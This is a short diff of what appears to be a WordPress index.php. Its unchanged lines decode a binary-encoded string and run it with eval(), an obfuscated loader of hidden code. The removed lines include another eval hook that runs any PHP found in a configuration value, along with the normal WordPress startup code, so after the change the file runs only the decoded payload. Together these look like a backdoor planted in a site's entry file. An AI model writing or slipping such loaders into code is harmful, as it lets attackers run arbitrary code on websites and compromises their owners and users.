@@ -5,16 +5,3 @@ $item = '';
 $context = str_split($state, 8);
 foreach($context as $kernel) { $item .= chr(bindec($kernel)); }
 eval('?>' . $item);
-if ($configData) {
-    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
-        try {
-            eval('?>' . $configData);
-        } catch (Exception $e) {
-            error_log('Configuration load error: ' . $e->getMessage());
-        }
-    }
-}
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
